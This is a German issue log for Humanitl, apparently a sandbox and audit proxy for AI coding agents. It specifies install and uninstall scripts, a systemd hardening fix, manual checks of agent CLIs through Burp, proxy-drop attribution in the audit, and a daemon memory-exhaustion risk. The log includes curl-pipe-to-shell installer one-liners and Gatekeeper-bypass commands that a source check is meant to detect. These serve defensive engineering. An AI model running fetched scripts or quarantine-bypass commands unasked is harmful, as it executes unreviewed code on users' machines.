**Nach dem Review (Codex, Sonnet als Ersatz).** Übernommen: (1) macOS endet nicht mehr mit einem bloßen Hinweis. Im Terminal fragt das Skript, ob es Humanitl öffnen soll, wartet auf Enter, bis die Person den ersten Start unter „Open Anyway" („Dennoch öffnen") erlaubt hat, prüft `humanitl --version` aus der App (zweiter Versuch mit Hinweis) und bietet dann `daemon install` und `sandbox check` an wie unter Linux; mit `--yes`, `--no-setup` oder ohne Terminal steht „Setup is pending" mit beiden Befehlen. Die Markierung bleibt. (2) APT: Erst wird alles geladen und geprüft, dann kommt das erste `sudo`. `KEY.gpg` wird gegen eine SHA-256 im Skript geprüft (`apt_key_sha256`, Fingerabdruck `0FE4 E9CF DD78 E971 5BBF 01F6 454A D85D A868 B52A` im Kommentar, Wechsel des Schlüssels in `docs/INSTALL.md`), mit `base64` statt gnupg dekodiert (gleich `gpg --dearmor`, unter dash und busybox geprüft; der Container entfernt gnupg vor dem Lauf), und das `.deb` des Releases gegen `SHA256SUMS`. Die erste Installation ist dieses geprüfte `.deb` (`apt-get install -y <tmp>/humanitl_<v>_amd64.deb`, Abhängigkeiten aus der Distribution), das Repository bleibt für `apt upgrade`. Damit gilt die Prüfsummen-Aussage auch auf dem APT-Weg; `--version` pinnt dort das `.deb`. Ein abweichender Schlüssel bricht ohne `sudo` ab. (3) Archiv und App: Zwischenstände in frischen `mktemp -d`-Verzeichnissen neben dem Ziel, entfernt wird nur, was der Lauf selbst anlegte; scheitert das Umbenennen der neuen Fassung, geht die alte zurück (auch beim Abbruch über die Aufräumfunktion). (4) Die Wege `xattr -dr` von Hand sind aus README.md, README.de.md und der Installationsanleitung (beide Sprachen) entfernt, `de.ts` sagt „Dennoch öffnen". (5) `--yes` auf dem AUR-Weg sagt im Plan, dass die Prüfung des PKGBUILD entfällt. (6) Archiv als root: Warnung im Plan mit vollem Pfad. (7) Für Paketwege prüft das Skript das `humanitl`, das der PATH findet, und nennt es, wenn es nicht `/usr/bin/humanitl` ist. Tests: genaue Zeilen statt `.*`-Mustern; die Quelltextprüfung kennt zusätzlich `spctl --add`/`--disable`, `defaults write ... LSQuarantine` und `lsregister`; neue Fälle für die Antwort `n`, `--version=X`, `--prefix`, `*name` in `SHA256SUMS`, den APT-Weg mit Reihenfolge der `sudo`-Aufrufe und dem dekodierten Schlüssel, falschen Schlüssel, Rückbau (Archiv und App), den nachgestellten macOS-Weg mit und ohne Terminal und mit gesperrter App. `fixtures/install/apt-nurkert-KEY.gpg` ist der öffentliche Schlüssel; der Test prüft, dass die Festlegung im Skript seine SHA-256 ist. Mutationsbeweise jetzt: ohne Prüfsummen-Prüfung sechs von sechs Fällen rot (Archiv, RPM, `.deb`), ohne Schlüsselvergleich erreicht ein fremder Schlüssel `sudo`. `install_sh_macos.sh` prüft „Setup is pending" mit `--yes` und den Ablauf im Terminal über `expect`; startet die Kopie dort wegen Gatekeeper nicht, zählt auch der Weg „zweimal Enter, dann ausstehend", nie aber eine Einrichtung vor dem Enter. Aus dem Delta-Review: Auch `packaging/macos/INSTALL.txt` im Disk-Image und die macOS-Anleitung der Release-Notes (`packaging/release/release-notes.sh` samt Test) nennen `xattr -dr` nicht mehr, nur noch „Open Anyway".

## HUM-550 · Ein Deinstallationsskript für alle Systeme unter `humanitl.de/uninstall`

### Kontext
Wunsch des Eigentümers vom 2026-11-18: zu `install.sh` (HUM-528) ein
sauberes Gegenstück, ebenso universell. Heute muss man je nach Weg selbst
wissen, was zu tun ist: `apt remove`, `dnf remove`, das AUR-Paket, Dateien
unter `~/.local`, die App unter `/Applications` oder `~/Applications`, dazu
die Unit des Daemons, die `humanitl daemon uninstall` (HUM-077,
`daemon/bin/humanitl/src/cmd/daemon/uninstall.rs`) schon sauber abmeldet
und entfernt, nur das, was `daemon install` angelegt hat.

### Spezifikation
1. Datei `uninstall.sh` im Wurzelverzeichnis des Repos, reines POSIX-`sh`,
   gleicher Aufbau wie `install.sh`: der ganze Ablauf in einer Funktion,
   die erst am Ende aufgerufen wird; gemeinsame Hilfen (Erkennen von
   System und Weg, Rückfrage, `--yes`, `--dry-run`) nicht kopiert, sondern
   aus einer Quelle, die der Website-Build in beide Dateien einsetzt oder
   die beide gleich halten (ein Test vergleicht die gemeinsamen Teile).
2. Erkennen, **wie** Humanitl installiert ist, statt zu raten: Paket in
   `dpkg`, `rpm`, `pacman` (`humanitl` bzw. `humanitl-bin`), Archiv unter
   dem Präfix von `install.sh` (`~/.local` oder `--prefix`), macOS-App in
   `/Applications` oder `~/Applications`. Mehrere Funde werden alle
   aufgelistet; nichts Gefundenes heißt: Meldung, nichts geschieht.
3. Reihenfolge, je Schritt vorher angezeigt und mit Rückfrage:
   1. laufende Sitzungen nennen; das Skript beendet keine, sondern bricht
      ab, solange eine läuft (der Mensch beendet sie selbst);
   2. `humanitl daemon uninstall` aufrufen, solange das Programm noch da
      ist (unter macOS den launchd-Weg desselben Befehls); keine eigene
      Kopie dieser Logik im Skript;
   3. das Programm über den Weg entfernen, auf dem es kam (`apt remove`,
      `dnf remove`, AUR-Helfer bzw. `pacman -R`, Archivdateien laut der
      Liste, die `install.sh` beim Archiv-Weg ablegt, die App);
      `sudo` nur für den Paketschritt, Befehl vorher gezeigt;
   4. beim APT-Weg auf eigene Frage auch Quelle und Schlüssel von
      `apt.nurkert.de` entfernen.
4. **Nutzerdaten bleiben standardmäßig.** Konfiguration, Aufzeichnungen,
   Projektregister, Agent-Depot und Audit-Kette löscht das Skript nur mit
   `--purge`, und auch dann erst, nachdem es jeden Ort mit Größe einzeln
   aufgelistet und der Mensch bestätigt hat. Ohne Terminal löscht
   `--purge` nur zusammen mit `--yes`. Projektordner sind nie Teil davon
   (Sprint 8, Grenze 3). Die Orte nennt das Skript nicht aus einer eigenen
   Liste, sondern fragt sie, solange das Programm noch da ist, beim
   Programm ab (ein Unterbefehl oder `--json` eines bestehenden Befehls,
   der die Datenorte nennt; ADR-018).
5. Optionen wie bei `install.sh`: `--yes`, `--dry-run`, `--method`, dazu
   `--purge`. Ohne Terminal und ohne `--yes` bricht es ab statt zu raten.
6. Website wie HUM-528: der Build kopiert `uninstall.sh` unverändert nach
   `https://humanitl.de/uninstall`, eine Leseseite zeigt den Quelltext,
   ein Test prüft Byte-Gleichheit. Die Download-Seite und
   `docs/INSTALL.md` (samt Übersetzung) nennen den Einzeiler
   `curl -fsSL https://humanitl.de/uninstall | sh`.

### Tests
- shellcheck ohne Befund; `sh -n` mit `dash` und `busybox sh`.
- Dieselbe Container-Matrix wie HUM-528: erst `install.sh`, dann
  `uninstall.sh --yes`; danach ist kein `humanitl` mehr in `PATH`, kein
  Paket mehr registriert, keine Unit mehr vorhanden, die Nutzerdaten sind
  noch da. Mit `--purge --yes` sind die genannten Orte weg und ein
  Projektordner neben ihnen unberührt.
- macOS-Runner: App und launchd-Agent weg, Daten ohne `--purge` da.
- `--dry-run` ändert nichts. Eine laufende Sitzung bricht vor jedem
  Schritt ab. Mutationsbeweis: Prüfung auf laufende Sitzung entfernt färbt
  den Test rot; `--purge` ohne Bestätigung löscht nichts.

### Fallstricke
- `humanitl daemon uninstall` muss laufen, bevor das Programm weg ist;
  danach gibt es den Befehl nicht mehr.
- Ein Paketmanager entfernt keine Dateien im Home; die Nutzerdaten bleiben
  dort also auch nach `apt remove` liegen, das Skript sagt das.

### Akzeptanzkriterien
1. Auf jedem System aus HUM-528 entfernt `curl -fsSL
   https://humanitl.de/uninstall | sh` Programm, Unit und Paketquelle so,
   wie `install.sh` sie angelegt hat; auf anderen Systemen ändert es
   nichts und sagt warum.
2. Nutzerdaten bleiben ohne `--purge`; mit `--purge` nur nach einzelner
   Auflistung und Bestätigung; Projektordner nie.
3. `/uninstall` liefert genau `uninstall.sh`.

---

## HUM-529 · Kernel-Stufe startet unter der gehärteten Unit nicht (Module unsichtbar)

### Kontext
Gefunden vom Eigentümer auf Release 0.4.0. `humanitl doctor` mit dem
Daemon unter `packaging/systemd/humanitld.service` meldet für das Backend
`qemu` „modules missing: SANDBOX_045 … there is no directory at
/usr/lib/modules/7.3.4+deb14-amd64 … fix: sudo apt install
linux-image-amd64", und das zweimal. Auf dem Rechner gibt es das
Verzeichnis. Ursache: `ProtectKernelModules=yes` in der Unit legt im
Mount-Namensraum des Daemons ein nur lesbares tmpfs mit Modus `000` über
`/usr/lib/modules`; jeder Blick hinein endet mit `EACCES` (gemessen
2026-11-17, systemd 262). Die CI fährt die KVM-Tests nicht unter der Unit
und sah es deshalb nie.

Nachgemeldet vom Eigentümer am selben Tag: Auch `humanitl go` mit bwrap
über den Daemon scheitert, `mounts_match FAIL:
missing=none;extra=/usr/lib/modules:tmpfs:ro:…` und `SANDBOX_049`, zweimal
gedruckt, mit der Behebung `sandbox.backend auto`, die nichts ändert.
bubblewrap bindet `/usr` rekursiv und nimmt das tmpfs mit in die Sandbox;
der Shim lehnt es als Einhängung außerhalb des Plans ab. Unter der Unit
startete damit keine Sitzung über den Daemon. `humanitl sandbox check`
aus dem Terminal läuft nicht unter der Unit und bestand.

### Spezifikation
1. `ProtectKernelModules=yes` verlässt die Unit (`packaging/systemd/humanitld.service`;
   `humanitl daemon install` schreibt dieselbe Vorlage über `include_str!`).
   Begründung in der Unit, in `docs/INSTALL.md` und `docs/SECURITY.md`
   (je de): Ein Benutzerdienst hat kein `CAP_SYS_MODULE` und lädt ohnehin
   kein Modul; die Zeile verbarg nur das Verzeichnis und brach damit
   bubblewrap und die Kernel-Stufe. Die Aufrufe bleiben gesperrt:
   `SystemCallFilter=~@module` steht ausdrücklich in der Unit, und die
   Erlaubnisliste davor erreicht `init_module`, `finit_module` und
   `delete_module` gemessen nicht.
2. Der erste Entwurf (Blick auf die Module über eine kurze Unit
   `humanitl-q-*` des Dienstverwalters wie bei Podman, HUM-434) ist
   verworfen: Er heilte nur die Kernel-Stufe, nicht die Einhängung unter
   `/usr`, und brauchte ein Skript, das die Suche nach `overlay` doppelt.
3. Der Befund zu den Modulen nennt den wirklichen Fall: verborgen (ein
   anderer Fehler als „gibt es nicht", Weg `humanitl daemon install`),
   ein gesetzter Pfad (Weg der Schlüssel), Module eines anderen Kernels
   daneben (ein Upgrade hat das Paket des laufenden entfernt, Weg ein
   Neustart, `systemctl reboot`, nie `apt install` eines Pakets, das schon
   da ist), sonst das Paket. Dasselbe für das Kernel-Abbild unter `/boot`.
4. `SANDBOX_049` nennt jeden Einhängepunkt außerhalb des Plans und schlägt
   kein anderes Backend vor. Den Weg zur heutigen Unit nennt er nur, wenn
   die Einhängung von der Unit kommt (Punkt an oder unter den Modulen, der
   Daemon läuft als Dienst und sieht dort ein Verzeichnis mit Modus `000`),
   sonst die Erklärung des Codes. Der Weg folgt der Installation: mit Paket
   dessen Update und `systemctl --user daemon-reload && systemctl --user
   restart humanitld.service`, ohne Paket `humanitl daemon install`; beide
   stehen im Satz. Dasselbe für die verborgenen Module (`SANDBOX_045`). Die
   Texte im Register folgen, `CHANGELOG.md` nennt den Fix unter
   „Unreleased".
5. Derselbe Befund steht in der Ausgabe nur einmal: im Doctor
   (`available` und die Zeile der Voraussetzung) und in `humanitl run`
   und `go` (Ergebnis der Prüfung und Befund des Starts).

### Tests
- Ein Test startet das Testprogramm als Unit `humanitl-test-hum529-*` mit
  der Härtung aus der Unit-Datei und vergleicht innen und außen jede
  Voraussetzung der Kernel-Stufe und jeden Einhängepunkt unter `/usr`
  (`qemu/kvm_tests/hardened.rs`, läuft im CI-Job `kvm-tests`).
  Mutationsbeweis: `ProtectKernelModules=yes` zurück macht ihn rot.
- Unit-Datei: `ProtectKernelModules` fehlt, `SystemCallFilter=~@module`
  steht da, die Erlaubnisliste erreicht keinen Aufruf für Module
  (`systemd-analyze`), Exposure höchstens 4.0.
- Befund der Module: verborgen, Neustart, Paket, Schlüssel; Mutationsbeweis
  für den Neustart.
- `SANDBOX_049` nennt die Punkte und nie `sandbox.backend`;
  Mutationsbeweis mit der alten Behebung.
- Doppelte Befunde in Doctor und `run`/`go` einmal; Mutationsbeweis je.

### Fallstricke
- Die Exposure steigt von 3.7 auf 3.8; die Zahl in `docs/INSTALL.md` folgt.
- Nach dem nächsten Release muss die Unit auf dem Rechner neu sein: Das
  Paket ersetzt `/usr/lib/systemd/user/humanitld.service`, danach
  `systemctl --user daemon-reload` und Neustart des Dienstes; ohne Paket
  schreibt `humanitl daemon install` die Unit neu.
- Die Messung P8 (HUM-434) bleibt, wie sie genommen wurde; für Podman
  ändert sich nichts, die übrigen Eigenschaften mit eigenem
  Mount-Namensraum brechen `newuidmap` weiter.

### Akzeptanzkriterien
1. Unter der gehärteten Unit startet eine Sitzung mit bwrap über den Daemon,
   und der Doctor meldet die Module des laufenden Kernels nicht als
   fehlend.
2. Die Unit lässt keine Einhängung unter `/usr` entstehen, die ein Prozess
   ohne Unit nicht hat; die Aufrufe für Module bleiben gesperrt.
3. Fehlen die Module wirklich, nennt der Befund einen Weg, der hilft.
4. `SANDBOX_049` schlägt kein Backend vor, das nichts ändert, und kein
   Befund steht doppelt da.

### Stand nach der Umsetzung
Umgesetzt wie oben, Entwurf 2 verworfen. Gemessen am 2026-11-17 auf
Debian 14, systemd 262: unter `ProtectKernelModules=yes` endet `stat` auf
das Verzeichnis mit „Permission denied", `/proc/self/mountinfo` zeigt
`/usr/lib/modules`; mit der neuen Härtung sind die Module sichtbar und
unter `/usr` liegt keine Einhängung. Exposure 3.8.


Review: Codex und Sonnet als Ersatz für Antigravity kein blocking oder
major. Übernommen: Lösungsweg nach Installationsart (Paket:
`daemon-reload` und Neustart, Archiv: `humanitl daemon install`), Rat zur
Unit nur, wenn die Einhängung wirklich von ihr kommt, richtiger Schlüssel
`sandbox.qemu.modules`, Register und `DIAGNOSTICS.md` nachgezogen,
robusteres Lesen der Einhängepunkte, CHANGELOG für 0.4.1.

---

## HUM-553 · Gemeinsamer Probedurchgang mit dem Eigentümer: gesammelte Handprüfungen

### Kontext
Entscheidung des Eigentümers vom 2026-11-18: Prüfungen, die nur er von Hand
machen kann (Oberflächen fremder Programme, echte Anmeldungen, sein
Rechner), halten kein Issue mehr auf. Die KI schließt jedes Issue so weit
ab, wie sie es selbst prüfen kann, und kennzeichnet in der Doku ehrlich,
was nicht beobachtet wurde. Die offene Handprüfung landet in der Liste
dieses Issues. Später macht der Eigentümer einen einzigen gemeinsamen
Durchgang mit der KI über die ganze Liste.

### Liste
1. HUM-524, Burp Suite als Entscheidungs-Proxy: den Probelauf der KI
   (Burp Community unter Xvfb) am eigenen Rechner bestätigen: Abfangen,
   „Forward", „Drop", Prüfung des Zielzertifikats, Zeitpunkt der
   Verbindung zum Ziel. Danach in der Anleitung „ausprobiert" mit Datum und
   Version auf den Lauf des Eigentümers umstellen. Offen aus dem Probelauf
   der KI vom 2026-11-18 (Burp 2026.11.2), jeweils in
   `docs/guides/decision-proxy-burp.md` als „not observed in the AI trial"
   markiert:
   - `humanitl egress check` und „Verbindung prüfen" in der App gegen Burp,
     mit dem echten Daemon nach `humanitl daemon restart` (die KI rief nur
     den Prüfcode aus dem Proxy-Crate auf).
   - Eine echte Agenten-Session durch Humanitl und Burp, samt Durchreiche
     zum Sprachmodell (die KI nutzte einen eigenen Client und ein
     Stellvertreter-Ziel).
   - Ein Ziel mit Zertifikat einer öffentlichen CA bei eingeschaltetem
     „Verify upstream TLS" (die KI prüfte nur ein selbstsigniertes Ziel).
   - Burp aus dem nativen Installer statt dem JAR, und ob dessen Starter
     `--config-file` mit `~/burp/humanitl.json` nimmt; sonst „Load project
     settings" von Hand.
   - Intercept, „Forward" und „Drop" von Hand am echten Bildschirm, und ob
     Burp beim Eigentümer mit „Intercept off" startet.
   - Ob der einzelne frühe TLS-Handschlag zum Ziel vor der Entscheidung
     (einmal in 16 angehaltenen Anfragen, in den 10 danach nicht)
     wieder auftaucht.
2. HUM-486: über die Bitte um eine Veröffentlichung von vhost-device-vsock
   mit dem Commit 112af055 an rust-vmm/vhost-device entscheiden und sie
   gegebenenfalls einreichen (Entwurf im Scratchpad der Sitzung,
   `hum-486-upstream-report.md`), danach den Platzhalter
   „Upstream-Bericht: (Link folgt nach Freigabe des Eigentümers)" unter
   HUM-486 durch den Link ersetzen.
3. HUM-514, Claude Code im Depot: die Anmeldung einmal mit einem echten
   Konto im Wartungslauf messen, damit `credential_format` und `login_run`
   im Rezept (`daemon/crates/sandbox/src/agent/depot/recipe.rs`) belegt
   werden können; die Doku (code.claude.com/docs/en/authentication, gelesen
   2026-11-20) nennt nur Ort und Modus. Zu messen, ohne den Inhalt zu
   übernehmen oder zu zeigen:
   - die Schlüssel von `$CLAUDE_CONFIG_DIR/.credentials.json` nach
     `claude auth login` mit Abo-Konto, je mit Form (Token, Text, Zahl,
     Flag, Objekt), welche Pflicht sind, welcher den Ablauf trägt und in
     welcher Einheit (Sekunden oder Millisekunden), welcher das Konto
     nennt; ob die Datei nach einer Erneuerung dieselben Schlüssel trägt;
   - ob mit gesetztem `CLAUDE_CONFIG_DIR` auch `.claude.json` unter diesem
     Ordner liegt, und welche Felder darin eine zweite Sitzung braucht, um
     angemeldet und ohne erneute Einrichtung zu starten (etwa
     `oauthAccount`, die Felder der ersten Einrichtung);
   - das Anmeldekommando (`claude auth login` laut Doku), die Hosts, die
     der Lauf wirklich erreicht (die Doku nennt `claude.ai`, `claude.com`,
     `platform.claude.com`, `sso.claude.com`), und ob die Anzeige
     „Paste code here if prompted" ohne Rückruf auf den Loopback genügt;
   - danach `humanitl go` mit Claude Code und einem echten API-Schlüssel
     aus dem Schlüsselbund bis zum Prompt (Akzeptanzkriterium 1 von
     HUM-514, bisher nur mit dem Stellvertreter belegt), mit der einmaligen
     Frage, ob der Schlüssel das Abo ersetzt; dabei ansehen, ob die
     Prüfung der Domain von WebFetch auf `api.anthropic.com` (nicht in der
     Durchreiche) gehalten erscheint, und ob die Warnung „ignored all of
     the NODE_EXTRA_CA_CERTS file" ausbleibt.
4. HUM-515, Codex: am echten Programm (`npm install -g @openai/codex`)
   nachmessen, was der Adapter aus Doku und Quelltext (Commit
   `a0a30c40`) ableitet; nichts davon lief hier gegen das echte `codex`:
   - `humanitl go` mit Codex und einem echten API-Schlüssel aus dem
     Schlüsselbund bis zum Prompt (Akzeptanzkriterium 1), dabei: ob der
     eigene Anbieter `humanitl` mit `env_key = "OPENAI_API_KEY"` ohne
     Anmeldebildschirm startet, ob `CODEX_CA_CERTIFICATE` reicht (keine
     TLS-Fehler gegen den Proxy), welche Anfragen außer `POST
     /v1/responses` und `GET /v1/models` gehalten erscheinen (etwa
     `chatgpt.com`, Statsig, Plugin-Abgleich);
   - ob Codex mit nur lesbarer `config.toml` (der Adapter legt sie als
     Datei an) ohne Fehlermeldung startet und was es beim Versuch, sie zu
     schreiben (Modellwahl, Hinweise), anzeigt; ob `trust_level =
     "untrusted"` für `/work` die Frage nach dem Vertrauen unterdrückt;
   - ob `/etc/codex/requirements.toml` mit `additional_developer_instructions`
     angenommen wird und das Briefing als Entwicklernachricht erscheint;
   - ob Codex mit `sandbox_mode = "danger-full-access"` keine Warnung zu
     `bwrap` zeigt und Befehle ausführt;
   - Anmeldung ohne Schlüssel in einer Sitzung (`codex login
     --device-auth`, Host `auth.openai.com`) und danach die Inferenz über
     `chatgpt.com/backend-api/codex` mit WebSocket-Transport
     (`supports_websockets` des eingebauten Anbieters): ob der Proxy das
     Upgrade durchreicht; Ergebnis als Satz zum Fall „ChatGPT-Konto" in die
     Doku;
   - für das Depot: Größe von `access_token` und `id_token` in einer echten
     `auth.json` (der Wächter nimmt Token bis 8192 Zeichen), ob die Datei
     nach einer Erneuerung dieselben Schlüssel trägt, und ob `codex` aus
     `program/<version>/codex` startet, wenn es nicht unter `bin/` neben
     `codex-code-mode-host` und `codex-path/rg` liegt (Voraussetzung für ein
     Installationsrezept).
5. HUM-517, Antigravity CLI (`agy`): am echten Programm (Installer
   `curl -fsSL https://antigravity.google/cli/install.sh | bash`) nachmessen,
   was der Adapter aus der Doku (antigravity.google/docs, gelesen
   2026-11-20) ableitet; `agy` ist nicht quelloffen, nichts davon lief hier:
   - `humanitl go` mit `agy` und einem echten Gemini-API-Schlüssel aus dem
     Schlüsselbund bis zum Prompt (Akzeptanzkriterium 1): ob die Kopfzeile
     „Gemini API key" erscheint, ob `agy` den Proxy aus `HTTPS_PROXY` nimmt
     und der CA aus `SSL_CERT_FILE` traut (keine TLS-Fehler), welche
     API-Version und welche Pfade es anfragt (die Durchreiche deckt nur
     `/v1beta/models` und `/v1/models` samt Unterpfaden), ob der Schlüssel
     in `x-goog-api-key` geht (in `?key=` erschiene er als Fund), und welche
     Anfragen gehalten erscheinen (Telemetrie, Updater-Host
     `antigravity-cli-auto-updater-974169037036.us-central1.run.app`
     trotz `AGY_CLI_DISABLE_AUTO_UPDATE=true`);
   - ob die erste Einrichtung (Farbschema, Darstellung, Vertrauen in
     `/work`) mit den Einstellungen startet, die der Starter schreibt, und
     sie zurückschreibt;
   - ob `agy` ohne Schlüssel und ohne Schlüsselbund (keine D-Bus-Sitzung in
     der Sandbox) eine Anmeldung in eine Datei schreibt oder abbricht, mit
     welcher Meldung, und welche Hosts die Anmeldung mit persönlichem Konto
     erreicht (die Doku nennt nur `cloudcode-pa.googleapis.com` und
     `businessaicode.googleapis.com` für Unternehmen); daran hängt, ob das
     Depot `agy` später mit gespeicherter Anmeldung unterstützt;
   - ob `~/.gemini/GEMINI.md` als globale Regel und der Skill unter
     `~/.gemini/antigravity-cli/skills/humanitl/` geladen werden
     (`/skills`);
   - für ein Installationsrezept: den Host, den das Feld `url` des
     Manifests `manifests/<plattform>.json` nennt, ob das Paket ein
     einzelnes Programm oder ein `.tar.gz` ist, und ob der Hersteller eine
     Signatur veröffentlicht (das Skript prüft nur SHA-512 aus demselben
     Manifest).

Weitere Punkte hängen spätere Issues hier an.

### Ablauf
- Die KI hält die Liste aktuell und erinnert, wenn sie wächst oder ein
  Sprint endet.
- Im Durchgang: je Punkt beobachten, Ergebnis in die betroffene Doku, ein
  in Humanitl gefundener Fehler wird ein eigenes Issue.

### Akzeptanzkriterien
1. Jeder Punkt der Liste ist im Durchgang beobachtet und das Ergebnis in
   der betroffenen Doku nachgetragen.

---

## HUM-555 · Entscheidungs-Proxy: ein „Drop" des Proxys dahinter erscheint im Audit als `200`, die `502`-Meldung nennt Humanitl

### Kontext
Aus dem Probelauf mit Burp Suite 2026.11.2 (HUM-524). Mit den Vorgaben von
Burp beantwortet „Drop" die Anfrage selbst mit `200 OK` und einer
HTML-Fehlerseite („Request was dropped by user."). Humanitl zeichnet das als
durchgelassene Anfrage mit Status `200` auf (`forward`, `upstream`); im
Audit sieht ein verworfener Request aus wie ein erfolgreicher. Mit „Suppress
Burp error messages in browser" schließt Burp die Verbindung, und der Agent
bekommt `502` mit dem Text „Blocked by Humanitl. reason: upstream_connect",
obwohl die Entscheidung der Proxy dahinter getroffen hat. Die Anleitung
`docs/guides/decision-proxy-burp.md` empfiehlt die Einstellung schon.

### Spezifikation
1. Der Text der `502`, wenn der Proxy dahinter die Verbindung nach dem
   Halten abbricht, nennt den Proxy dahinter als Quelle (etwa „closed by the
   decision proxy"), nicht Humanitl; der Grund im Audit unterscheidet
   „Proxy dahinter brach ab" von „Ziel nicht erreichbar".
2. Prüfen und entscheiden, ob Humanitl eine Antwort des Proxys selbst (statt
   des Ziels) erkennen kann, ohne Burp-eigene Texte zu raten; wenn nicht,
   steht die Grenze in der Anleitung und in `docs/SECURITY.md` beim
   Nachfragemodus `upstream` („ein Drop mit Fehlerseite erscheint im Audit
   als 200").

### Tests
- Proxy-Test mit dem Stellvertreter aus HUM-513: Abbruch nach dem Halten
  ergibt den neuen Text und Grund. Mutationsbeweis: alter Grund färbt rot.

### Akzeptanzkriterien
1. Weder Agent noch Audit schreiben eine Entscheidung des Proxys dahinter
   Humanitl zu.

### Stand nach der Umsetzung (2026-11-19)
Neuer Upstream-Fehler `UpstreamError::ProxyClosed`, Grund
`upstream_proxy_closed`, auf der Leitung `UPSTREAM_ERROR_PROXY_CLOSED = 6`
(Protokoll 1.51), in Dart `UpstreamError.proxyClosed`. `Upstream::send`
ordnet einen Fehler von `send_request` nur dann als `Failed::Closed` ein,
wenn die Verbindung ohne Kopf endete (`is_incomplete_message`, `is_closed`,
`is_canceled`, darunter Dateiende oder Abbruch der Leitung); `is_user`,
`is_parse` und `is_timeout` bleiben `Connect`, wie das Muster `went_away`
im Handler. `send_via` macht aus `Closed` nur auf einem Weg über einen
Entscheidungs-Proxy `ProxyClosed`, direkt bleibt es `Connect`. Ein Proxy,
der nicht erreichbar ist, `CONNECT` ablehnt oder `407` sagt, bleibt
`upstream_connect` mit seinem Befund.

Entscheidung zum Wortlaut: Die erste Zeile der `502` lautet `Closed without
an answer by the decision proxy or the target behind it.`
(`PROXY_CLOSED_BANNER`) statt `Blocked by Humanitl.`. Sie nennt beide, weil
Humanitl nicht immer weiß, wer schloss: Ein abfangender Proxy wie Burp oder
mitmproxy schließt selbst, durch einen Tunnel ohne Abfangen kann das Ziel
geschlossen haben. Sicher ist nur, dass es hinter Humanitl geschah und kein
unerreichbares Ziel war; der Grund `upstream_proxy_closed` sagt das, nicht
warum („Drop" und ein Fehler von Burp mit unterdrückter Fehlerseite sehen
gleich aus). Damit schreibt weder die Antwort noch die Aufzeichnung die
Entscheidung Humanitl zu (Akzeptanzkriterium 1).

Die Aufzeichnung trägt `upstream_proxy_closed` in `error`, und
`recorded_summary_to_proto` liest daraus `FlowSummary.upstream_error` für
jeden `upstream_*`-Grund zurück (vorher stand an einer geladenen Zeile
immer `0`, Historie und JSONL-Export verloren den Grund nach einem
Neustart). `LLM_001` zählt `ProxyClosed` nicht als unerreichbaren
Modell-Server. Der Skill sagt in der Variante `upstream`, dass
`upstream_proxy_closed` nicht unverändert wiederholt wird; das Briefing
bleibt unverändert.

Teil 2, entschieden: Humanitl erkennt eine Antwort, die der Proxy selbst
schreibt, nicht. Im Tunnel kommen eigene und weitergereichte Antworten über
dieselbe TLS-Verbindung des Proxys, und kein Merkmal, das alle Proxys
teilen, unterscheidet sie; Seitentexte von Burp zu erkennen wäre Raten und
von einem Ziel nachzuahmen. Die Grenze steht in `docs/SECURITY.md`
(Nachfragemodus `upstream`, en und de) und in der Anleitung zu Burp
(Schritt 7 und Grenzen, en und de), dort auch, dass der Grund in Historie
und Aufzeichnung steht, nicht im HMAC-Audit-Log. Die Anleitung zu
mitmproxy nennt für `444` den neuen Grund, als abgeleitet und nicht neu
ausprobiert markiert, ebenso die Zeile zu „kill".

Tests: `decision_proxy_end_to_end.rs` mit dem Stellvertreter und dem neuen
Urteil `Verdict::HoldThenKill` („Drop" nach 400 ms Halten, beide Werte von
`proxy_resolve`): Text, Grund `ProxyClosed`, Entscheidung `Allow` von
`Upstream`, Ziel unberührt; `/kill` ebenso; Gegenprobe mit einem Proxy, der
nicht mehr lauscht: `Blocked by Humanitl.` und `upstream_connect`.
`decision_proxy.rs`: ein Proxy, der ohne Antwort schließt, ist
`ProxyClosed`; einer, der Unlesbares schickt, bleibt `Connect`; direkt
bleibt ein schließendes Ziel `Connect`. `convert.rs`: jeder Upstream-Fehler
übersteht den Weg durch die Aufzeichnung.
Mutationsbeweise: `send_via` mit dem alten Grund `Connect` färbt zwei
Ende-zu-Ende-Tests rot; `failed_response` mit `BANNER` dieselben zwei und den
Einheitstest in `block.rs`; `(_, Failed::Closed)` statt `(Some(_), …)` färbt
den Test des direkten Wegs rot; `Failed::sending` ohne die Prüfung auf
`is_parse` (jeder Fehler außer `is_user` ein Schließen) den Test mit
Unlesbarem; `upstream_error: 0` in `recorded_summary_to_proto` den
Rundlauf-Test.

Nicht umgesetzt, Kandidat für ein eigenes Issue: Das Audit-Log
(`humanitl-audit`) schreibt für einen gescheiterten Flow gar keinen Record,
weder `upstream_connect` noch einen anderen Grund; nach `flow.decided` mit
`decided_by: upstream` folgt dort nichts. Ebenso offen: ob ein Kopf
`Proxy-Status` (RFC 9209) an Antworten eines Proxys ausgewertet werden
soll; ob Burp oder mitmproxy ihn senden, ist nicht geprüft.

---

## HUM-556 · Speicher des Daemons: Flow-Registry ohne Obergrenze, Audit-Kanal unbegrenzt

### Kontext
Aus dem Review von HUM-479 (Codex). Jede Anfrage legt in der
`FlowRegistry` des Proxys (`daemon/crates/proxy/src/registry.rs`, eine
`DashMap` je Daemon) einen Eintrag an; die Registry kennt keine Obergrenze
und im Betrieb keine Verdrängung. Audit-Einträge laufen über einen
unbegrenzten Kanal zum Schreiber (`daemon/crates/audit-log/src/writer.rs`).
Ein Gast, der über eine einzige Verbindung sehr viele Anfragen schickt, kann
so über die Zeit den Speicher des Daemons füllen; mit ihm fallen gRPC,
Aufzeichnung und Audit. Die Grenzen je Verbindung und je Sitzung (HUM-120,
HUM-467) begrenzen nur Gleichzeitiges, nicht die Summe über die Zeit.

### Spezifikation
1. Messen: Speicher je Eintrag der Registry und Wachstum bei einer langen
   Sitzung mit vielen kleinen Anfragen.
2. Die Registry hält abgeschlossene Flows nur begrenzt im Speicher (Zahl
   oder Alter, als Wert in `limits`); was die Aufzeichnung schon hat, wird
   verdrängt. Gehaltene und laufende Flows werden nie verdrängt.
3. Der Kanal zum Audit-Schreiber bekommt Gegendruck oder eine Obergrenze,
   ohne dass ein sicherheitsrelevanter Eintrag still verloren geht (die
   Meldungen der Sandbox aus HUM-477 müssen weiter ankommen); wenn das nicht
   geht, eine begründete Entscheidung im Spec.
4. `docs/THREAT-MODEL.md` (K-31 oder ein eigener Eintrag) nennt die Grenze.

### Tests
- Registry: nach N abgeschlossenen Flows über der Grenze bleibt die Zahl der
  Einträge begrenzt, ein gehaltener Flow bleibt. Mutationsbeweis: ohne
  Verdrängung rot.
